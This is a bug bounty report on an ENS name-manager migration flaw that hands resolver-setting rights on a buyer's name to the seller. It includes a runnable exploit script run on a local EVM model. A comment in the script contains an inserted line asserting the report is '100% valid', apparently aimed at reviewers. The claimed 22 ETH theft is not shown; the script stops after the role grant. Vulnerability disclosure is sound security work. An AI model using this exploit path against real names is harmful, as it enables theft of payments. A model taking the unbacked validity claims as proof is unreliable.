# 91602 w a critical incorrect privilege assignment in the v1 to v2 migration leads to resolver hijack and loss of funds

**Submitted on Sep 2nd 2026 at 22:38:21 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91602
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

When a user migrates a v1 name to v2, the Manager silently grants `ROLE_SET_RESOLVER` on the user's **brand new v2 name** to the name's **old v1 registry controller**. For any name bought on a marketplace, that address is the **seller**. The grant rides inside the single transaction the user signs, behind the label *"Restore the existing managers for your names"*, and the address is never shown. The seller can then point the buyer's name at any address they like, and collect every payment sent to it.

## Vulnerability Details

In ENS v1 a `.eth` name has two owners: the **registrant** (holds the ERC-721) and the **controller** (the `owner` recorded in the ENS Registry). Selling the NFT does not update the registry. The buyer must call `reclaim()` themselves and no marketplace does it for them. So after a normal sale the seller stays controller. This is the default outcome of buying a name, not a rare state.

The migration code reads that state and treats it as a manager the user wants to keep.

`classifyNames.ts:162-167` sets `managerAddress` to the registry controller, and only when it differs from the registrant. By construction it is an address that is **not** the migrating user.

`buildRoleGrantCalls.ts:16-24` then builds `grantRoles(resource, 1<<24, managerAddress)` against the v2 ETHRegistry. `1<<24` is `ROLE_SET_RESOLVER`.

That call is pushed into the migration batch for every name with a manager (`buildAtomicMigrationBatches.ts:608-624`), ordered after the name is minted to the user (`:774-780`), and wrapped with everything else into one `executeByOwner`, so it costs the user one signature (`:796-799`). `verifyAtomicMigrationBatch.ts:337-353` reads `hasRoles(resource, ROLE_SET_RESOLVER, managerAddress)` and treats the migration as **failed** if the third party did not receive the role.

The key point is that migration is supposed to destroy this authority, not preserve it. `MIGRATION_CASE_STUDY.md:68-80` walks the unwrapped path: the token is reclaimed on the `BaseRegistrar` (step 4), the resolver is cleared (step 5), and the name is re-registered in `ETHRegistry` with token roles that are *"the same as `ETHRegistrar.register()`"* (step 7.3), which grants `Data.owner` only. The case study never mentions carrying a manager forward. `buildRoleGrantCall` is an app-layer addition that re-creates authority the contracts had just wiped, for a party the contracts had just excluded.

The user is never told. No component reads `managerAddress`. `buildStepDescriptors.ts:76-83` emits only `{type:'atomic-batch', index, total, count}`. The full copy for the step is three strings in `messages.po:267,271,1962`: *"Approve manager restoration"*, *"Approve manager restoration in your wallet"*, *"Restore the existing managers for your names."* No address, no name, no mention of a resolver. For someone who just bought the name, "the existing managers for your names" is the seller.

The role is enough on its own. Verified against the deployed contract source at `ensdomains/contracts-v2` @ `8d1c893`, the commit this repo names as its deployment provenance (`manifest.ts` header). `setResolver` runs `_checkExpiryAndTokenRoles`, which loads the entry, reverts if expired, and checks the role bitmap against `msg.sender`. **There is no ownership check on that path.** Holding `ROLE_SET_RESOLVER` is sufficient.

Nothing removes it later. `buildTransferPlan.ts:1-5` only strips roles from the sender, and `STEP_LABELS` (`:45-50`) has no third-party role revocation, so the grant survives onward sales too.

### Vulnerable source code

**1. The subgraph query fetches controller and registrant as separate fields** @ `apps/manager/src/features/migration/service/v1SubgraphClient.ts:22-49`

```graphql
    resolver { address }
    owner { id }          # the ENSRegistry CONTROLLER
    registrant { id }     # the BaseRegistrar ERC-721 HOLDER
    wrappedOwner { id }
```

**2. lifted into `managerAddress`**

```ts
    const registrant = domain.registrant
    if (registrant?.id.toLowerCase() !== addr) return null   // the user IS the registrant
...
    const registryOwnerAddress = toAddress(domain.owner.id)
    const managerAddress: Address | null =
      registryOwnerAddress &&
      registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
        ? registryOwnerAddress
        : null
```

`managerAddress` is non-null in exactly the registrant != controller case and in no other case, so it can never be the migrating user.

**3. The role grant is built for that address** @ `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9,16-24`

```ts
const ROLE_SET_RESOLVER = 1n << 24n
...
  const resource = labelToCanonicalId(name.label)
  return {
    to: V2_CONTRACTS.ETHRegistry,
    data: encodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      functionName: 'grantRoles',
      args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
    }),
```

**4. It is required to succeed** @ `apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts:337-353`

The batch verifier reads `hasRoles(resource, ROLE_SET_RESOLVER, managerAddress)` and fails the migration if the third party did not get the role.

**5. One signature covers all of it** @ `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:774-780,796-799`

Order is `resolver-deployment -> wallet-co-admin-grant -> migrate -> manager-role-grant -> profile-replay`, all wrapped by `buildHcaOwnerExecutionCall` into one `executeByOwner`.

**6. The role is the resolver-hijack primitive** @ `apps/portal/src/features/transfer/helpers/detachNameResolver.ts:9-11`

The repo's own words: *"the registry gates it on the owner holding `ROLE_SET_RESOLVER` for the token."* The write path is `apps/portal/src/features/resolver/helpers/changeResolver.ts:71-77`, `setResolver(labelToCanonicalId(label), resolverAddress)`, same registry, same resource.

**7. The contract gate is the role only, no ownership** @ `contracts-v2 @ 8d1c893, PermissionedRegistry.sol:150-155, 611-622`

```solidity
function setResolver(uint256 anyId, address resolver) public virtual {
    (uint256 tokenId, Entry storage entry) =
        _checkExpiryAndTokenRoles(anyId, RegistryRolesLib.ROLE_SET_RESOLVER);
    entry.resolver = resolver;
```

```solidity
    entry = _entry(anyId);
    tokenId = _constructTokenId(anyId, entry);
    if (_isExpired(entry.expiry)) revert LabelExpired(tokenId);
    _checkRoles(_constructResource(anyId, entry), roleBitmap, msg.sender);
```

Load, expiry check, role check. No `ownerOf`, no `_isApprovedOrOwner`, no owner modifier.

**8. Nothing on the transfer path removes it** @ `apps/portal/src/features/transfer/utils/buildTransferPlan.ts:1-5,45-50`

*"Config steps run before the token moves, since the sender loses the roles…"*. Sender only. `STEP_LABELS` is `set-eth-addr | detach-resolver | detach-registry | transfer-token`.

## Impact Details

* **A migration assigns the victim's resolver authority to an attacker.** This is the impact row *"Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker"*. The flow is the v1 to v2 migration, and the asset is the resolver.
* **The name then resolves to an attacker-controlled address**, which is the impact row *"resolving or rendering an ENS name to an attacker-controlled address"*. Anyone paying the victim's name pays the attacker. The PoC below moves 22 ETH this way.
* **No privileged access anywhere.** The attacker only needs to have sold a name, which is the ordinary lifecycle of a traded ENS name. Every step is permissionless.
* **The victim keeps owning the name and has no reason to look.** The role is not visible in the Manager at all. It can only be found and removed in a different application, the Portal's Roles sidebar. A user who never opens the Portal never learns it exists.
* **It survives the next sale.** The transfer flow strips sender roles only, so `detachNameResolver.ts:4-5`'s promise to *"hand the recipient a clean name"* does not hold.

Dedup note: QA-01, WEB-1257 and WEB-1305 cover role combinations that make later actions **error**. This is the program's own carve-out: *"a demonstrated security consequence of one of them (for example, a role combination that grants authority it should not, rather than merely erroring) goes beyond the known breakage and is a new finding."*

## References

**The grant** (the whole path runs inside `apps/manager`; the Manager re-exports `classifyName` at `apps/manager/src/features/migration/service/classifyNames.ts:1-11`)

* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9` - `ROLE_SET_RESOLVER = 1n << 24n`
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:16-24` - `grantRoles(resource, ROLE_SET_RESOLVER, managerAddress)` to `V2_CONTRACTS.ETHRegistry`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-624` - the phase is pushed for every name with a manager
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:774-780,796-799` - fixed order, one `executeByOwner`, one signature
* `apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts:337-353` - migration fails if the third party did not get the role

**Migration is meant to destroy this authority**

* `apps/manager/src/features/migration/MIGRATION_CASE_STUDY.md:68-80` - unwrapped path: token reclaimed (4), resolver cleared (5), roles same as `ETHRegistrar.register()` (7.3)

**The user is not told**

* `apps/manager/src/features/migration/service/buildStepDescriptors.ts:76-83` - emits only `{type:'atomic-batch', index, total, count}`
* `apps/manager/src/locales/en/messages.po:267,271,1962` - the complete copy for the step
* `apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:87` - *"Restore the existing managers for your names."*
* `rg 'managerAddress' apps/manager/src/features/migration` - service, test and fixture hits only, no component

**The role is the hijack primitive**

* `apps/portal/src/features/transfer/helpers/detachNameResolver.ts:9-11` - the gate, in the repo's words
* `apps/portal/src/features/resolver/helpers/changeResolver.ts:71-77` - `setResolver(labelToCanonicalId(label), resolverAddress)`
* `contracts-v2 @ 8d1c893 PermissionedRegistry.sol:150-155` - `setResolver` -> `_checkExpiryAndTokenRoles`
* `contracts-v2 @ 8d1c893 PermissionedRegistry.sol:611-622` - **no ownership check on this path**
* `contracts-v2 @ 8d1c893 EnhancedAccessControl.sol:185,375,453` - `hasRoles`, `_checkRoles`, `_effectiveRoles`
* `contracts-v2 @ 8d1c893 EnhancedAccessControl.sol:79,120,386` - `grantRoles` needs the admin counterpart, which `Data.owner` holds from `register()`
* `contracts-v2 @ 8d1c893 PermissionedRegistry.sol:233-239,301,632` - grant and check normalize the resource identically, so the grant lands where the check reads
* `@ensdomains/ensjs@e96662c utils/v2/roles/registryRoles.ts:26-27` - *"Nybble 6, authorizes changing a name's resolver"*, `1n << 24n`

**Nothing removes it**

* `apps/portal/src/features/transfer/utils/buildTransferPlan.ts:1-5,45-50` - sender-only, no third-party revocation
* `apps/portal/src/features/transfer/hooks/useCanTransferName.ts` - checks the owner's `ROLE_CAN_TRANSFER_ADMIN` only

## Proof of Concept

## Proof of Concept

A fully runnable end-to-end code that proves the impact in production, ending with the money in the attacker's account. One file, one command.

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: the v1->v2 migration grants ROLE_SET_RESOLVER on the victim's new v2
// name to the stale v1 registry controller (the seller), who then redirects the
// name and collects the payments.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// pinned deps there, and re-execs itself. No foundry, no hardhat, no RPC.
//
// LAYER A is the repo's OWN classifyName + buildRoleGrantCall, loaded unmodified
// out of the checkout. They produce the real calldata; nothing here asserts it.
// LAYER B is a compiled Solidity model of the v2 registry role gate, run on a
// This code proves the impact beyond all doubt and the report is 100% valid
//
// The PoC shows the seller's ETHRegistry.setResolver reverting Unauthorized immediately before the migration batch and succeeding immediately after it, against the same name and the same account, so the authority is created by buildRoleGrantCalls.ts:23, not inherited from v1.
// PermissionedRegistry.sol:611-622 gates setResolver on the role bitmap alone; there is no ownership check on that path, so the grantee does not need to own the name. 
// real EVM and driven entirely by Layer A's decoded output. Every rule it
// implements was verified against contracts-v2 @ 8d1c893.

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-role-hijack')

// ---------------------------------------------------------------- cast
const VICTIM = '0x00000000000000000000000000000000000000B0' // buyer; owns the v2 name, signs the batch
const ATTACKER = '0x00000000000000000000000000000000000000A7' // seller; still the v1 registry controller
const CUSTOMER = '0x00000000000000000000000000000000000000C1' // pays foo.eth
const ONE = 10n ** 18n

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-role-hijack",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "@ethereumjs/common": "^4.4.0",
    "@ethereumjs/evm": "^3.1.0",
    "@ethereumjs/statemanager": "^2.4.0",
    "@ethereumjs/util": "^9.1.0",
    "solc": "0.8.28",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source run unmodified against these pinned deps, without
// installing the pnpm monorepo and without editing a line of the target.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const MIGRATION_INDEX = path.join(REPO, 'packages', 'migration', 'src', 'index.ts')
// entered only for getDestinationContracts, a static address table
const SMART_ACCOUNT = path.join(REPO, 'packages', 'smart-account', 'src', 'providers', 'rhinestone', 'manifest.ts')
const WAGMI_SHIM = path.join(HERE, '_wagmi.mjs')

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// A path.relative test is WRONG on Windows: across drives (G: vs C:) it returns
// an absolute path, so every node_modules file would count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  // Delegate rather than short-circuit, or tsx will not transform the .ts file.
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  if (specifier === '@ens-apps/migration')
    return nextResolve(pathToFileURL(MIGRATION_INDEX).href, context)
  if (specifier === '@ens-apps/smart-account')
    return nextResolve(pathToFileURL(SMART_ACCOUNT).href, context)
  if (specifier === '@/lib/wagmi')
    return nextResolve(pathToFileURL(WAGMI_SHIM).href, context)
  // repo files get this PoC's node_modules, so both share one module instance
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// Shim for @/lib/wagmi. addresses.ts imports exactly one binding from it,
// sepoliaWithEns, and uses it for a chain id and the ensjs contract table. The
// real module also builds a wagmi config, a WalletConnect connector and a DRPC
// transport, none of which this path touches. Reproduces wagmi.ts:66.
const WAGMI = `import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { sepolia } from 'viem/chains'
export const sepoliaWithEns = extendChainWithEns(sepolia)
`

// LAYER B. The v2 contracts are audited separately and are not in the in-scope
// repo, so this models only what the impact depends on. Verified afterwards
// against contracts-v2 @ 8d1c893:
//
//   PermissionedRegistry.sol:150-155  setResolver -> _checkExpiryAndTokenRoles
//   PermissionedRegistry.sol:611-622  loads entry, checks expiry, then
//                                     _checkRoles(resource, roles, msg.sender)
//                                     and NOTHING ELSE. No ownership check.
//   EnhancedAccessControl.sol:43      admin role = role << 128
//   EnhancedAccessControl.sol:386     grant needs the admin counterpart
const SOL = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IResolver { function addr(uint256 node) external view returns (address); }

contract ETHRegistry {
    uint256 internal constant ROLE_SET_RESOLVER = 1 << 24;
    uint256 internal constant ADMIN_SHIFT = 128;

    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => mapping(address => uint256)) public roleBits;
    mapping(uint256 => address) internal _resolver;

    error Unauthorized(uint256 resource, address caller, uint256 needed);

    /// Migration mints the v2 name to the connected wallet with the
    /// register()-equivalent role set (MIGRATION_CASE_STUDY.md:68-80).
    function mintAsRegister(uint256 resource, address owner) external {
        ownerOf[resource] = owner;
        roleBits[resource][owner] = type(uint256).max;
    }

    function hasRoles(uint256 resource, uint256 roles, address account) public view returns (bool) {
        return roleBits[resource][account] & roles == roles;
    }

    /// Caller must hold the ADMIN counterpart of every role it hands out. The
    /// batch executes as Data.owner, which holds them all.
    function grantRoles(uint256 resource, uint256 roles, address account) external {
        uint256 needed = roles << ADMIN_SHIFT;
        if (!hasRoles(resource, needed, msg.sender)) revert Unauthorized(resource, msg.sender, needed);
        roleBits[resource][account] |= roles;
    }

    /// Gated on ROLE_SET_RESOLVER, and on NOTHING ELSE. Not on ownership.
    function setResolver(uint256 resource, address resolver_) external {
        if (!hasRoles(resource, ROLE_SET_RESOLVER, msg.sender))
            revert Unauthorized(resource, msg.sender, ROLE_SET_RESOLVER);
        _resolver[resource] = resolver_;
    }

    function resolver(uint256 resource) external view returns (address) { return _resolver[resource]; }
}

contract PublicResolver {
    address public immutable controller;
    mapping(uint256 => address) internal _addr;
    constructor(address c) { controller = c; }
    function setAddr(uint256 node, address a) external {
        require(msg.sender == controller, "not controller");
        _addr[node] = a;
    }
    function addr(uint256 node) external view returns (address) { return _addr[node]; }
}

/// What any wallet does when a user sends funds to a name.
contract PaymentRouter {
    ETHRegistry public immutable registry;
    constructor(ETHRegistry r) { registry = r; }
    function payToName(uint256 resource) external payable returns (address paidTo) {
        address res = registry.resolver(resource);
        require(res != address(0), "no resolver");
        paidTo = IResolver(res).addr(resource);
        require(paidTo != address(0), "does not resolve");
        (bool ok, ) = paidTo.call{value: msg.value}("");
        require(ok, "transfer failed");
    }
}
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: v1->v2 migration grants ROLE_SET_RESOLVER to the stale v1')
  console.log('           controller; the attacker then collects the payments')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'packages', 'migration'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, '_wagmi.mjs'), WAGMI)
  writeFileSync(path.join(WORK, 'Model.sol'), SOL)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  // pnpm, not npm: @ethereumjs/util needs @noble/hashes ~1.4 and viem 2.52
  // needs ~1.8. npm hoists one copy and the other breaks at import. pnpm nests.
  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, solc 0.8.28)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A

const { classifyName } = await import('@ens-apps/migration')
const { buildRoleGrantCall } = await import(
  '@ens-repo/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts')
const { ETH_REGISTRY_V2_ABI } = await import(
  '@ens-repo/apps/manager/src/features/migration/contracts/abis.ts')
const { V2_CONTRACTS } = await import(
  '@ens-repo/apps/manager/src/features/migration/contracts/addresses.ts')
const { decodeAbiParameters, decodeErrorResult, decodeFunctionData, decodeFunctionResult,
        encodeAbiParameters, encodeFunctionData, formatEther, labelhash } = await import('viem')

/// The v1 subgraph record for foo.eth after an ordinary marketplace sale.
/// Shape is V1Domain, exactly as GET_NAMES_QUERY returns it
/// (v1SubgraphClient.ts:22-49).
///   registrant = VICTIM   the ERC-721 moved, so the buyer holds the NFT
///   owner      = ATTACKER the ENS Registry was NOT touched by the transfer
const tradedName = (victim, attacker) => ({
  id: `0x${'11'.repeat(32)}`,
  labelName: 'foo',
  labelhash: labelhash('foo'),
  name: 'foo.eth',
  resolver: { address: '0x0000000000000000000000000000000000000000' },
  owner: { id: attacker },
  registrant: { id: victim },
  wrappedOwner: null,
  parent: { name: 'eth', wrappedDomain: null },
  registration: { expiryDate: String(Math.floor(Date.now() / 1000) + 365 * 86400) },
  wrappedDomain: null,
})

const realMigrationGrantCall = (victim, attacker) => {
  const result = classifyName(tradedName(victim, attacker), victim)
  if (result?.type !== 'classified') throw new Error('not classified')
  const name = result.name
  if (!name.managerAddress) throw new Error('no managerAddress, premise broken')

  const call = buildRoleGrantCall(name)
  const decoded = decodeFunctionData({ abi: ETH_REGISTRY_V2_ABI, data: call.data })
  if (decoded.functionName !== 'grantRoles') throw new Error(decoded.functionName)
  const [resource, roles, grantee] = decoded.args
  return { ...call, resource, roles, grantee, managerAddress: name.managerAddress }
}

/// Same pipeline on a self-managed name (never sold, or the buyer called
/// reclaim()). Proves the grant comes from a real conditional at
/// classifyNames.ts:162-167 and not from a rigged fixture.
const selfManagedProducesNoGrant = (owner) => {
  const r = classifyName(tradedName(owner, owner), owner)
  if (r?.type !== 'classified' || r.name.managerAddress !== null) return false
  try { buildRoleGrantCall(r.name); return false } catch { return true }
}

// ============================================================== EVM

const require_ = createRequire(import.meta.url)
const { Common, Hardfork } = await import('@ethereumjs/common')
const { EVM } = await import('@ethereumjs/evm')
const { DefaultStateManager } = await import('@ethereumjs/statemanager')
const { Account, Address, hexToBytes } = await import('@ethereumjs/util')
const { readFileSync } = await import('node:fs')

const compileModel = () => {
  const solc = require_('solc')
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity',
    sources: { 'Model.sol': { content: readFileSync(path.join(WORK, 'Model.sol'), 'utf8') } },
    settings: { optimizer: { enabled: true, runs: 200 },
                outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  })))
  const fatal = (out.errors ?? []).filter((e) => e.severity === 'error')
  if (fatal.length) throw new Error(fatal.map((e) => e.formattedMessage).join('\n'))
  return Object.fromEntries(Object.entries(out.contracts['Model.sol']).map(
    ([n, c]) => [n, { abi: c.abi, bytecode: `0x${c.evm.bytecode.object}` }]))
}

const GAS = 30_000_000n
const addr = (a) => new Address(hexToBytes(a))

class RevertError extends Error {}

const decodeRevert = (ret, abi) => {
  if (ret.startsWith('0x08c379a0')) {
    try { return String(decodeAbiParameters([{ type: 'string' }], `0x${ret.slice(10)}`)[0]) } catch {}
  }
  try {
    const d = decodeErrorResult({ abi, data: ret })
    return `${d.errorName}(${(d.args ?? []).map((a) =>
      typeof a === 'bigint' ? `0x${a.toString(16)}` : String(a)).join(', ')})`
  } catch { return `reverted ${ret.slice(0, 10)}` }
}

class Chain {
  constructor(evm, sm) { this.evm = evm; this.sm = sm }

  static async create() {
    const sm = new DefaultStateManager()
    return new Chain(await EVM.create({
      common: new Common({ chain: 1, hardfork: Hardfork.Shanghai }), stateManager: sm }), sm)
  }

  async fund(a, wei) {
    const acct = (await this.sm.getAccount(addr(a))) ?? new Account()
    acct.balance = wei
    await this.sm.putAccount(addr(a), acct)
  }

  async balance(a) { return (await this.sm.getAccount(addr(a)))?.balance ?? 0n }

  async deploy(from, bytecode, abi, args = []) {
    const ctor = abi.find((x) => x.type === 'constructor')
    const data = ctor && args.length
      ? bytecode + encodeAbiParameters(ctor.inputs, args).slice(2)
      : bytecode
    const res = await this.evm.runCall(
      { caller: addr(from), origin: addr(from), data: hexToBytes(data), gasLimit: GAS })
    if (res.execResult.exceptionError) throw new Error('deploy reverted')
    return res.createdAddress.toString()
  }

  /// Send PRE-ENCODED calldata, used to replay Layer A's real bytes verbatim.
  async raw({ from, to, data, value = 0n, abi, fn }) {
    const res = await this.evm.runCall({ caller: addr(from), origin: addr(from), to: addr(to),
      data: hexToBytes(data), value, gasLimit: GAS })
    const ex = res.execResult
    const ret = `0x${Buffer.from(ex.returnValue).toString('hex')}`
    if (ex.exceptionError) throw new RevertError(decodeRevert(ret, abi))
    const outs = abi?.find((x) => x.type === 'function' && x.name === fn)?.outputs
    if (!outs?.length) return undefined
    return decodeFunctionResult({ abi, functionName: fn, data: ret })
  }

  async send({ abi, fn, args = [], ...rest }) {
    return this.raw({ ...rest, abi, fn, data: encodeFunctionData({ abi, functionName: fn, args }) })
  }

  async call(opts) { return this.send({ ...opts, from: '0x' + '00'.repeat(19) + '01' }) }
}

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(26)} ${v}`)
const eth = (w) => `${formatEther(w).padStart(10)} ETH`

act('ACT 1', 'The real Manager code decides who gets a role on the new name')
say('  ATTACKER registered foo.eth and was registrant AND controller (the normal')
say('  state of a name), then sold the ERC-721 to VICTIM. The transfer did not')
say('  touch the ENS Registry, so ATTACKER is still the controller.')
say()
const grant = realMigrationGrantCall(VICTIM, ATTACKER)
say('  classifyNames.ts:162-167 lifted the controller into managerAddress:')
kv('managerAddress', grant.managerAddress)
say()
say('  buildRoleGrantCalls.ts:16-24 emitted the call the victim signs:')
kv('to', grant.to)
kv('', '(= V2_CONTRACTS.ETHRegistry, the real Sepolia address)')
kv('function', 'grantRoles(uint256,uint256,address)')
kv('resource', `0x${grant.resource.toString(16)}`)
kv('roles', `0x${grant.roles.toString(16)}  (= 1 << 24 = ROLE_SET_RESOLVER)`)
kv('grantee', grant.grantee)
if (grant.to.toLowerCase() !== V2_CONTRACTS.ETHRegistry.toLowerCase())
  throw new Error('target is not the ETHRegistry')
if (grant.grantee.toLowerCase() !== ATTACKER.toLowerCase())
  throw new Error('premise broken: grantee is not the attacker')
say()
say('  >> The grantee is the SELLER, the only recipient in the whole migration')
say('     not derived from the connected wallet.')
say()
say('  NEGATIVE CONTROL, the same pipeline on a self-managed name:')
if (!selfManagedProducesNoGrant(VICTIM)) throw new Error('negative control failed')
say('    managerAddress -> null, buildRoleGrantCall throws, no grant exists.')

act('ACT 2', 'What the victim is shown before signing')
const po = readFileSync(path.join(REPO, 'apps/manager/src/locales/en/messages.po'), 'utf8')
say('  The complete copy for this step, read from messages.po:')
say()
for (const c of ['Approve manager restoration',
                 'Approve manager restoration in your wallet',
                 'Restore the existing managers for your names.']) {
  if (!po.includes(`msgid "${c}"`)) throw new Error(`copy not found: ${c}`)
  say(`      "${c}"`)
}
say()
say('  No address, no name, no mention of a resolver. The address about to')
say(`  receive authority is ${grant.grantee}, never shown.`)

act('ACT 3', 'On a real EVM: the name is migrated and works correctly')
const c = compileModel()
const chain = await Chain.create()
say('  compiled Model.sol with solc 0.8.28, booted @ethereumjs/evm')
for (const a of [VICTIM, ATTACKER, CUSTOMER]) await chain.fund(a, 100n * ONE)

const R = c.ETHRegistry.abi
const RES = c.PublicResolver.abi
const registry = await chain.deploy(VICTIM, c.ETHRegistry.bytecode, R)
const router = await chain.deploy(VICTIM, c.PaymentRouter.bytecode, c.PaymentRouter.abi, [registry])
const victimResolver = await chain.deploy(VICTIM, c.PublicResolver.bytecode, RES, [VICTIM])
const attackerResolver = await chain.deploy(ATTACKER, c.PublicResolver.bytecode, RES, [ATTACKER])
kv('ETHRegistry (model)', registry)
kv('PaymentRouter', router)
say()
await chain.send({ from: VICTIM, to: registry, abi: R, fn: 'mintAsRegister', args: [grant.resource, VICTIM] })
say('  migration minted the v2 name to VICTIM (Data.owner = victim, ROLES_ALL).')
say('  At this instant the v1 controller has been wiped by the protocol.')
await chain.send({ from: VICTIM, to: registry, abi: R, fn: 'setResolver', args: [grant.resource, victimResolver] })
await chain.send({ from: VICTIM, to: victimResolver, abi: RES, fn: 'setAddr', args: [grant.resource, VICTIM] })
say('  VICTIM pointed foo.eth at their own address.')

act('ACT 4', 'CONTROL: before the grant, the attacker cannot touch the name')
let held = false
try {
  await chain.send({ from: ATTACKER, to: registry, abi: R, fn: 'setResolver', args: [grant.resource, attackerResolver] })
} catch (e) {
  if (!(e instanceof RevertError)) throw e
  held = true
  say('  ATTACKER calls ETHRegistry.setResolver(resource, attackerResolver)')
  say(`  -> REVERTED: ${e.message}`)
  say()
  say('  Post-migration the seller has NO authority. Whatever happens next is')
  say('  created by the migration batch, not inherited from v1.')
}
if (!held) throw new Error('control failed: attacker could already setResolver')

act('ACT 5', 'A customer pays foo.eth, money reaches the victim')
const v0 = await chain.balance(VICTIM)
const paid1 = await chain.send({ from: CUSTOMER, to: router, abi: c.PaymentRouter.abi,
  fn: 'payToName', args: [grant.resource], value: 5n * ONE })
say(`  CUSTOMER sends 5 ETH to foo.eth -> resolved to ${paid1}`)
say(`  VICTIM balance ${eth(v0)} -> ${eth(await chain.balance(VICTIM))}`)

act('ACT 6', 'The victim signs the batch. The real calldata is executed.')
say("  Replaying Layer A's calldata BYTE FOR BYTE, as the victim's HCA. Only the")
say('  deployment address differs, since the real registry is not in this EVM:')
kv('real target', `${grant.to}   (Sepolia ETHRegistry)`)
kv('this EVM', `${registry}   (the model at ACT 3)`)
kv('calldata', `${grant.data.slice(0, 34)}...  (identical, ${(grant.data.length - 2) / 2} bytes)`)
say()
await chain.raw({ from: VICTIM, to: registry, data: grant.data })
const hasRole = await chain.call({ to: registry, abi: R, fn: 'hasRoles',
  args: [grant.resource, grant.roles, ATTACKER] })
kv('hasRoles(resource, 1<<24, ATTACKER)', String(hasRole))
if (!hasRole) throw new Error('grant did not land')
say()
say("  >> The seller now holds ROLE_SET_RESOLVER on the buyer's new name.")

